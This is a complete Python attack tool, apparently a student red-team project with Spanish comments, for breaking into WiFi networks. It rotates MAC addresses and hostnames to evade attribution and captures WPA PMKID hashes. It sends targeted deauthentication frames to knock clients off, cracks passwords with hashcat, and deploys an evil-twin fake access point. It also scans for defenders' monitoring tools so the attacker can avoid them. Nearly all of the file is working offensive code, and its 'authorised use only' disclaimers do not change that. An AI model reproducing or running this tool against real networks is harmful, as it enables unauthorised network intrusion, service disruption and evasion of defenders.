#!/usr/bin/env python3
"""
Nexora Silence - Herramienta de pentesting WiFi con técnicas de evasión
Proyecto académico - Ingeniería en Ciberseguridad
USO EXCLUSIVO EN ENTORNOS AUTORIZADOS

Esta herramienta implementa diversas técnicas de evasión para minimizar la huella
detectable durante un ejercicio de Red Team vs Blue Team.

ADVERTENCIA: El uso no autorizado sobre redes de terceros es ilegal.
"""

import os
import sys
import csv as csv_mod
import subprocess
import threading
import time
import random
import string
import signal
import atexit
import re
import logging
import shutil
from datetime import datetime

# === CONSTANTES Y CONFIGURACIÓN GLOBAL ===

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

LOG_FILE = "nexora-silence.log"
RESULTS_CSV = "nexora-silence-results.csv"
CAPTURE_FILE = "capture.pcapng"
PMKID_FILE = "pmkid.16800"
CRACKED_FILE = "cracked.txt"
HOSTAPD_CONF = "hostapd_stealth.conf"

# Regex reutilizable para direcciones MAC (soporta minúsculas y mayúsculas)
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

# Configuración de logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_info(msg):
    logging.info(msg)
    print(f"{Colors.OKCYAN}[*]{Colors.ENDC} {msg}")

def log_warn(msg):
    logging.warning(msg)
    print(f"{Colors.WARNING}[!] {msg}{Colors.ENDC}")

def log_error(msg):
    logging.error(msg)
    print(f"{Colors.FAIL}[-]{Colors.ENDC} {msg}")

def log_success(msg):
    logging.info(f"SUCCESS: {msg}")
    print(f"{Colors.OKGREEN}[+]{Colors.ENDC} {msg}")


# === CLASE: IdentityManager ===
class IdentityManager:
    """
    MÓDULO 1: Gestión Dinámica de Identidad
    Rota MAC y hostname para evitar correlación de tráfico del atacante.
    """
    def __init__(self, interface):
        self.interface = interface
        self.original_mac = self._get_current_mac()
        self.original_hostname = subprocess.check_output(
            ["hostname"], text=True
        ).strip()
        # CORRECCIÓN 1: el evento se llama _stop_event para no colisionar
        # con el método público stop_rotation().
        self._stop_event = threading.Event()
        self.rotation_thread = None

    def _get_current_mac(self):
        try:
            output = subprocess.check_output(
                ["ip", "link", "show", self.interface], text=True
            )
            mac_match = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", output)
            return mac_match.group(1) if mac_match else None
        except Exception as e:
            log_error(f"No se pudo leer la MAC actual: {e}")
            return None

    def generate_stealth_mac(self):
        # CORRECCIÓN 2: exactamente 6 octetos (02 + 5 aleatorios).
        mac = ["02"]  # administrada localmente, no asociada a fabricante real
        for _ in range(5):
            mac.append(f"{random.randint(0, 255):02x}")
        return ":".join(mac)

    def change_mac(self, new_mac=None):
        if not new_mac:
            new_mac = self.generate_stealth_mac()

        if not MAC_RE.match(new_mac):
            log_error(f"MAC inválida generada o recibida: {new_mac}")
            return False

        try:
            subprocess.run(["ip", "link", "set", self.interface, "down"],
                           check=True, capture_output=True)
            subprocess.run(["macchanger", "-m", new_mac, self.interface],
                           check=True, capture_output=True)
            subprocess.run(["ip", "link", "set", self.interface, "up"],
                           check=True, capture_output=True)
            log_info(f"Identidad rotada: nueva MAC {new_mac}")
            return True
        except subprocess.CalledProcessError as e:
            log_error(f"Error cambiando MAC: {e}")
            return False

    def change_hostname(self):
        new_hostname = f"android-phone-{random.randint(1000, 9999)}"
        try:
            subprocess.run(["hostname", new_hostname], check=True)
            log_info(f"Hostname cambiado a: {new_hostname}")
        except Exception as e:
            log_error(f"Error cambiando hostname: {e}")

    def _rotation_loop(self):
        while not self._stop_event.is_set():
            wait_time = random.randint(30, 60)
            # Espera interrumpible: despierta si se pide parar
            if self._stop_event.wait(timeout=wait_time):
                break
            self.change_mac()
            self.change_hostname()

    def start_rotation(self):
        if self.rotation_thread and self.rotation_thread.is_alive():
            log_warn("La rotación ya está activa.")
            return
        log_info("Iniciando rotación dinámica de identidad en background...")
        self._stop_event.clear()
        self.rotation_thread = threading.Thread(
            target=self._rotation_loop, daemon=True
        )
        self.rotation_thread.start()

    def stop_rotation(self):
        """Detiene la rotación. CORRECCIÓN 1: método público con nombre libre."""
        if self.rotation_thread and self.rotation_thread.is_alive():
            self._stop_event.set()
            self.rotation_thread.join(timeout=3)
            log_info("Rotación de identidad detenida.")

    def restore_identity(self):
        log_info("Restaurando identidad original...")
        # Detener la rotación primero, por seguridad
        self.stop_rotation()

        if self.original_mac:
            self.change_mac(self.original_mac)
        try:
            subprocess.run(["hostname", self.original_hostname], check=True)
        except Exception:
            pass
        log_success("Identidad original restaurada.")


# === CLASE: PassiveScanner ===
class PassiveScanner:
    """
    MÓDULO 2: Escaneo Pasivo Inteligente
    Evita channel hopping; se fija un canal para reducir la firma detectable.
    """
    def __init__(self, interface):
        self.interface = interface

    def scan_fixed_channel(self, channel, duration=30):
        # Validar el canal
        try:
            ch = int(channel)
        except (TypeError, ValueError):
            log_error(f"Canal inválido: {channel}")
            return []
        if not 1 <= ch <= 196:
            log_error(f"Canal fuera de rango: {ch}")
            return []

        log_info(f"Iniciando escaneo pasivo en canal {ch} por {duration}s...")
        base = "temp_scan"

        # Limpiar restos de ejecuciones previas
        for f in os.listdir('.'):
            if f.startswith(base):
                try:
                    os.remove(f)
                except OSError:
                    pass

        csv_file = None
        process = None
        try:
            cmd = ["airodump-ng", "--channel", str(ch), "-w", base,
                   "--output-format", "csv", self.interface]
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(duration)
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

            for f in os.listdir('.'):
                if f.startswith(base) and f.endswith(".csv"):
                    csv_file = f
                    break

            if not csv_file:
                log_error("No se generó archivo de escaneo.")
                return []

            return self._parse_airodump_csv(csv_file)
        except Exception as e:
            log_error(f"Error en escaneo pasivo: {e}")
            return []
        finally:
            # CORRECCIÓN EXTRA: limpieza de artefactos temporales
            for f in os.listdir('.'):
                if f.startswith(base):
                    try:
                        os.remove(f)
                    except OSError:
                        pass

    def _parse_airodump_csv(self, filepath):
        # CORRECCIÓN 4: parser CSV real, respeta comillas y comas dentro del SSID.
        aps = []
        try:
            with open(filepath, newline='', encoding='utf-8',
                      errors='replace') as f:
                rows = list(csv_mod.reader(f))
        except Exception as e:
            log_error(f"No se pudo abrir el CSV: {e}")
            return []

        # Localizar la sección de APs: la primera fila cuya primera celda es "BSSID"
        start = None
        for i, row in enumerate(rows):
            if row and row[0].strip() == "BSSID":
                start = i
                break
        if start is None:
            return []

        for row in rows[start + 1:]:
            if not row or len(row) < 14:
                continue
            bssid = row[0].strip()
            # Saltar filas de encabezado o basura hasta llegar a una MAC
            if not MAC_RE.match(bssid):
                continue
            aps.append({
                'bssid':   bssid,
                'channel': row[3].strip(),
                'pwr':     row[4].strip(),
                'ssid':    row[13].strip(),
            })
        return aps


# === CLASE: HandshakeCapturer ===
class HandshakeCapturer:
    """
    MÓDULO 3: Captura de Handshake Sigilosa
    Prioriza PMKID (pasivo) sobre Deauth (activo, detectable).
    """
    def __init__(self, interface):
        self.interface = interface

    def capture_pmkid(self, bssid, timeout=90):
        # CORRECCIÓN 3a: validar el BSSID antes de invocar hcxdumptool.
        if not MAC_RE.match(bssid or ""):
            log_error(f"BSSID inválido: {bssid}")
            return False

        log_info(f"Intentando captura PMKID (sigilosa) contra {bssid}...")

        # Elegir el conversor disponible (hcxpcaptool está deprecado).
        converter = None
        for tool in ("hcxpcapngtool", "hcxpcaptool"):
            if shutil.which(tool):
                converter = tool
                break
        if converter is None:
            log_error("Se requiere 'hcxpcapngtool' (o 'hcxpcaptool') instalado.")
            return False

        # CORRECCIÓN 3b: el BSSID ahora se usa como filtro real.
        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", CAPTURE_FILE,
            "--enable_status=1",
            f"--filterlist_ap={bssid}",
            "--filtermode=2",  # solo tramas del AP indicado
        ]
        try:
            subprocess.run(cmd, timeout=timeout, capture_output=True)
        except subprocess.TimeoutExpired:
            log_info("Timeout de captura PMKID alcanzado (normal).")
        except Exception as e:
            log_error(f"Error ejecutando hcxdumptool: {e}")
            return False

        if not os.path.exists(CAPTURE_FILE) or os.path.getsize(CAPTURE_FILE) == 0:
            log_warn("No se generó captura.")
            return False

        # Convertir a formato hashcat 16800
        try:
            subprocess.run(
                [converter, "-z", PMKID_FILE, CAPTURE_FILE],
                check=True, capture_output=True
            )
        except subprocess.CalledProcessError as e:
            log_error(f"Error convirtiendo captura: {e}")
            return False

        if os.path.exists(PMKID_FILE) and os.path.getsize(PMKID_FILE) > 0:
            log_success(f"PMKID capturado y guardado en {PMKID_FILE}")
            return True
        log_warn("No se obtuvo PMKID del objetivo.")
        return False

    def targeted_deauth(self, bssid, client_mac, count=3):
        # CORRECCIÓN 10: validar formato de MACs.
        if not MAC_RE.match(bssid or "") or not MAC_RE.match(client_mac or ""):
            log_error("Formato de MAC inválido para BSSID o cliente.")
            return False

        log_warn(f"Ejecutando Deauth dirigido (agresivo) a {client_mac}...")
        try:
            cmd = [
                "aireplay-ng", "--deauth", str(count),
                "-a", bssid, "-c", client_mac, self.interface,
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            log_info("Ráfaga de deauth enviada. Esperando reconexión...")
            return True
        except subprocess.CalledProcessError as e:
            log_error(f"Error en deauth: {e}")
            return False


# === CLASE: HashCracker ===
class HashCracker:
    """
    MÓDULO 4: Cracking con Hashcat
    """
    def crack(self, hash_file, wordlist, mode="16800"):
        if not os.path.exists(hash_file):
            log_error(f"Archivo de hash no encontrado: {hash_file}")
            return None
        if not os.path.exists(wordlist):
            log_error(f"Diccionario no encontrado: {wordlist}")
            return None
        if not (mode.isdigit() and len(mode) in (4, 5)):
            log_error(f"Modo hashcat inválido: {mode}")
            return None

        log_info(f"Iniciando cracking con Hashcat (modo {mode})...")
        # CORRECCIÓN 11: sin --force por defecto; salida a archivo, más fiable.
        try:
            if os.path.exists(CRACKED_FILE):
                os.remove(CRACKED_FILE)

            cmd = [
                "hashcat",
                "-m", mode,
                hash_file,
                wordlist,
                "--outfile", CRACKED_FILE,
                "--outfile-format", "2",
                "--quiet",
            ]
            subprocess.run(cmd, capture_output=True, text=True, timeout=3600)

            if os.path.exists(CRACKED_FILE) and os.path.getsize(CRACKED_FILE) > 0:
                with open(CRACKED_FILE, "r", errors="replace") as fh:
                    pwd = fh.readline().strip()
                if pwd:
                    log_success(f"¡Contraseña encontrada!: {pwd}")
                    return pwd

            log_error("No se pudo crackear con el diccionario proporcionado.")
            return None
        except subprocess.TimeoutExpired:
            log_error("Hashcat excedió el tiempo máximo (1 hora).")
        except Exception as e:
            log_error(f"Error ejecutando hashcat: {e}")
        return None


# === CLASE: StealthFakeAP ===
class StealthFakeAP:
    """
    MÓDULO 5: Fake AP Sigiloso (Evil Twin)
    """
    def __init__(self, interface):
        self.interface = interface
        # CORRECCIÓN 5: guardar el proceso para poder terminarlo en cleanup().
        self.process = None
        self.passphrase = None

    def create_ap(self, ssid, channel, passphrase=None):
        if not ssid:
            log_error("El SSID no puede estar vacío.")
            return False
        try:
            ch = int(channel)
        except (TypeError, ValueError):
            log_error(f"Canal inválido: {channel}")
            return False

        # CORRECCIÓN 14: passphrase aleatoria si no se proporciona.
        self.passphrase = passphrase or "".join(
            random.choices(string.ascii_letters + string.digits, k=12)
        )

        stealth_channel = ch + 1 if ch < 13 else ch - 1
        log_info(f"Creando Fake AP '{ssid}' en canal adyacente {stealth_channel}...")

        # Si ya había uno corriendo, detenerlo antes
        self.stop_ap()

        conf = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={stealth_channel}
wpa=2
wpa_passphrase={self.passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
beacon_int=500
"""
        try:
            with open(HOSTAPD_CONF, "w") as f:
                f.write(conf)
        except OSError as e:
            log_error(f"No se pudo escribir {HOSTAPD_CONF}: {e}")
            return False

        try:
            self.process = subprocess.Popen(
                ["hostapd", HOSTAPD_CONF],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            log_error("hostapd no está instalado.")
            return False
        except Exception as e:
            log_error(f"Error iniciando hostapd: {e}")
            return False

        # Pequeña espera para detectar fallo inmediato
        time.sleep(1)
        if self.process.poll() is not None:
            log_error("hostapd terminó inesperadamente. Revisa la configuración "
                      "y que la interfaz soporte modo AP.")
            return False

        log_success(f"Fake AP activo en canal {stealth_channel}.")
        log_info(f"Passphrase del Fake AP: {self.passphrase}")
        return True

    def stop_ap(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.process.kill()
            log_info("Fake AP detenido.")
        self.process = None


# === CLASE: CounterSurveillance ===
class CounterSurveillance:
    """
    MÓDULO 6: Contra-vigilancia.
    Heurística: busca interfaces en modo monitor distintas a la nuestra y
    patrones asociados a herramientas de monitoreo (kismet, wireshark).
    """
    def __init__(self, interface):
        self.interface = interface

    def detect_blue_team(self):
        log_info("Analizando entorno en busca de monitores (Blue Team)...")
        suspicious = []

        # 1) Otras interfaces en modo monitor en el sistema
        try:
            output = subprocess.check_output(
                ["iw", "dev"], text=True, stderr=subprocess.DEVNULL
            )
            # Bloque por interfaz
            blocks = re.split(r"\n(?=phy#|\s*Interface )", output)
            for block in blocks:
                m_iface = re.search(r"Interface\s+(\S+)", block)
                if not m_iface:
                    continue
                iface_name = m_iface.group(1)
                if iface_name == self.interface:
                    continue
                if re.search(r"type\s+monitor", block):
                    suspicious.append(
                        f"Interfaz en modo monitor detectada: {iface_name}"
                    )
        except Exception as e:
            log_error(f"No se pudo inspeccionar interfaces: {e}")

        # 2) Procesos de monitoreo conocidos
        for proc in ("kismet", "wireshark", "tshark", "airodump-ng"):
            try:
                r = subprocess.run(
                    ["pgrep", "-x", proc],
                    capture_output=True, text=True
                )
                if r.returncode == 0 and r.stdout.strip():
                    # airodump-ng propio puede aparecer; lo excluimos por PID padre
                    if proc == "airodump-ng":
                        # si no somos nosotros los que lo lanzamos, marcamos
                        continue
                    suspicious.append(f"Proceso activo: {proc}")
            except Exception:
                pass

        if suspicious:
            log_warn("ALERTA: posible actividad de monitoreo detectada:")
            for s in suspicious:
                print(f"    - {s}")
            return True

        log_info("No se detectaron defensores activos.")
        return False


# === CLASE: NexoraSilence (Main) ===
class NexoraSilence:
    def __init__(self):
        self.interface = ""
        self.monitor_mode_started = False
        self.id_manager = None
        self.scanner = None
        self.capturer = None
        self.cracker = None
        self.fake_ap = None
        self.surveillance = None

    def banner(self):
        print(f"""{Colors.OKCYAN}
    ███╗   ██╗██████╗ ██╗██████╗  ██████╗ ██████╗ ██████╗
    ████╗  ██║██╔══██╗██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗
    ██╔██╗ ██║██║  ██║██║██║  ██║██║   ██║██████╔╝██║  ██║
    ██║╚██╗██║██║  ██║██║██║  ██║██║   ██║██╔══██╗██║  ██║
    ██║ ╚████║██████╔╝██║██████╔╝██║   ██║██║  ██║██████╔╝
    ╚═╝  ╚═══╝╚═════╝ ╚═╝╚═════╝ ╚═╝   ╚═╝╚═╝  ╚═╝╚═════╝
                {Colors.BOLD}SILENCE EDITION{Colors.ENDC} - Academic Project
        {Colors.ENDC}""")
        print(f"{Colors.WARNING}ADVERTENCIA: Uso exclusivo en entornos "
              f"controlados y autorizados.{Colors.ENDC}\n")

    def check_requirements(self):
        if os.geteuid() != 0:
            log_error("Este script debe ejecutarse como root (sudo).")
            sys.exit(1)

        # CORRECCIÓN 6: lista completa de binarios realmente usados.
        tools = [
            "airmon-ng", "airodump-ng", "aireplay-ng",
            "macchanger", "hcxdumptool", "hashcat",
            "iw", "ip", "hostapd", "pgrep",
        ]
        # Conversor: al menos uno de los dos debe existir
        converters = ["hcxpcapngtool", "hcxpcaptool"]

        missing = [t for t in tools if shutil.which(t) is None]
        if not any(shutil.which(c) for c in converters):
            missing.append("hcxpcapngtool (o hcxpcaptool)")

        if missing:
            log_error("Faltan las siguientes herramientas: "
                      + ", ".join(missing))
            log_info("Instálalas con: sudo apt install aircrack-ng hcxdumptool "
                     "hcxtools hashcat macchanger hostapd iw iproute2")
            sys.exit(1)
        log_success("Todas las dependencias están instaladas.")

    def setup_interface(self):
        while True:
            iface = input(
                f"{Colors.OKBLUE}[?] Ingresa la interfaz WiFi "
                f"(ej. wlan0): {Colors.ENDC}"
            ).strip()
            if not iface:
                log_error("Debes introducir un nombre de interfaz.")
                continue

            # Verificar que existe antes de tocar airmon-ng
            if subprocess.run(["ip", "link", "show", iface],
                              capture_output=True).returncode != 0:
                log_error(f"La interfaz {iface} no existe.")
                continue

            try:
                log_info(f"Configurando {iface} en modo monitor...")
                subprocess.run(
                    ["airmon-ng", "start", iface],
                    check=True, capture_output=True
                )

                # airmon-ng suele renombrar a <iface>mon, pero no siempre.
                candidates = [f"{iface}mon", iface]
                mon_iface = None
                for c in candidates:
                    if subprocess.run(["ip", "link", "show", c],
                                      capture_output=True).returncode == 0:
                        mon_iface = c
                        break
                if mon_iface is None:
                    log_error("No se pudo determinar la interfaz en modo monitor.")
                    continue

                self.interface = mon_iface
                self.monitor_mode_started = True

                self.id_manager = IdentityManager(self.interface)
                self.scanner = PassiveScanner(self.interface)
                self.capturer = HandshakeCapturer(self.interface)
                self.cracker = HashCracker()
                self.fake_ap = StealthFakeAP(self.interface)
                self.surveillance = CounterSurveillance(self.interface)

                log_success(f"Interfaz {self.interface} lista (modo monitor).")
                return
            except subprocess.CalledProcessError as e:
                log_error(f"Error configurando interfaz: {e}")
                # Si airmon-ng dejó la interfaz a medias, intentar revertir
                subprocess.run(["airmon-ng", "stop", iface],
                               capture_output=True)

    def main_menu(self):
        while True:
            print(f"\n{Colors.BOLD}--- NEXORA SILENCE MENU ---{Colors.ENDC}")
            print("1. Escaneo pasivo inteligente")
            print("2. Captura sigilosa de handshake (PMKID)")
            print("3. Ataque de Deauth dirigido")
            print("4. Cracking de hash (Hashcat)")
            print("5. Desplegar Fake AP sigiloso")
            print("6. Detector de Blue Team")
            print("7. Gestión de identidad (rotar MAC/hostname)")
            print("0. Salir")

            choice = input(
                f"{Colors.OKBLUE}[>] Selecciona una opción: {Colors.ENDC}"
            ).strip()

            try:
                if choice == '1':
                    ch = input("Canal a escanear: ").strip()
                    aps = self.scanner.scan_fixed_channel(ch)
                    if aps:
                        print(f"\n{Colors.BOLD}{'BSSID':<20} {'CH':<5} "
                              f"{'PWR':<5} {'SSID':<30}{Colors.ENDC}")
                        for ap in aps:
                            print(f"{ap['bssid']:<20} {ap['channel']:<5} "
                                  f"{ap['pwr']:<5} {ap['ssid']:<30}")
                    else:
                        log_warn("No se encontraron APs en este canal.")

                elif choice == '2':
                    bssid = input("BSSID objetivo: ").strip()
                    if self.capturer.capture_pmkid(bssid):
                        log_success(f"Hash guardado en {PMKID_FILE}")

                elif choice == '3':
                    bssid = input("BSSID objetivo: ").strip()
                    client = input("MAC del cliente: ").strip()
                    self.capturer.targeted_deauth(bssid, client)

                elif choice == '4':
                    hfile = input("Archivo de hash: ").strip()
                    wlist = input("Ruta al diccionario: ").strip()
                    mode = input("Modo Hashcat (16800=PMKID, 22000=WPA): ").strip()
                    self.cracker.crack(hfile, wlist, mode)

                elif choice == '5':
                    ssid = input("SSID del Fake AP: ").strip()
                    ch = input("Canal del AP real: ").strip()
                    if self.fake_ap.create_ap(ssid, ch):
                        log_info("Usa la opción 5 de nuevo para recrearlo, "
                                 "o sal para detenerlo.")

                elif choice == '6':
                    self.surveillance.detect_blue_team()

                elif choice == '7':
                    if (self.id_manager.rotation_thread
                            and self.id_manager.rotation_thread.is_alive()):
                        self.id_manager.stop_rotation()
                    else:
                        self.id_manager.start_rotation()

                elif choice == '0':
                    log_info("Saliendo de Nexora Silence...")
                    break
                else:
                    log_warn("Opción no válida.")
            except KeyboardInterrupt:
                print()
                log_warn("Operación cancelada por el usuario.")
            except Exception as e:
                log_error(f"Error inesperado en el menú: {e}")


def cleanup():
    """
    Se ejecuta al salir (atexit). Restaura el sistema al estado original
    sin abortar si algo falla: cada paso va en su propio try.
    """
    app = globals().get('app')
    if app is None:
        return

    # 1) Fake AP
    if app.fake_ap:
        try:
            app.fake_ap.stop_ap()
        except Exception as e:
            print(f"[cleanup] No se pudo detener Fake AP: {e}", file=sys.stderr)

    # 2) Rotación de identidad + MAC/hostname
    if app.id_manager:
        try:
            app.id_manager.restore_identity()
        except Exception as e:
            print(f"[cleanup] No se pudo restaurar identidad: {e}",
                  file=sys.stderr)

    # 3) Modo monitor
    if app.interface and app.monitor_mode_started:
        try:
            subprocess.run(["airmon-ng", "stop", app.interface],
                           capture_output=True, timeout=10)
            log_info(f"Modo monitor desactivado en {app.interface}")
        except Exception as e:
            print(f"[cleanup] No se pudo desactivar modo monitor: {e}",
                  file=sys.stderr)


if __name__ == "__main__":
    app = NexoraSilence()
    atexit.register(cleanup)

    # Ctrl+C → salida limpia (atexit se encarga del cleanup)
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))

    app.banner()
    app.check_requirements()
    app.setup_interface()
    app.main_menu()